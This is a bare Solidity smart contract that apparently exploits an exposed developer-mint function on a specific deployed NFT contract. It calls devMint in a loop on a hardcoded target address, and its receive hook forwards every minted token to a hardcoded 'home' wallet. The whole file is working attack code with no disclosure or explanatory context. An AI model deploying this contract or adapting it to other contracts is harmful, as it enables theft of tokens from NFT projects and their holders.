// SPDX-License-Identifier: Unlisenced
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


pragma solidity ^0.8.0;


interface Target 
{
    function devMint(uint256) external;
    function transferFrom(address,address,uint256) external;
}

contract Interaction is IERC721Receiver
{

    address constant targetAdd = 0xFE402d0Ab1A72ef1977e6Af7ADA7adC1eDB023D0;
    address constant home = 0x2E4419EffF3156A6B9dC7F53C42C1ED9a943F43e;

    function mintMany() external
    {
        for (int i=0;i<10;i++)
        {
            Target(targetAdd).devMint(5);
        }
    }


    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,        
        bytes calldata data
    ) external returns (bytes4)
    {
        operator;
        from;
        tokenId;
        data;

        Target(0xFE402d0Ab1A72ef1977e6Af7ADA7adC1eDB023D0).transferFrom(address(this), home, tokenId);
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}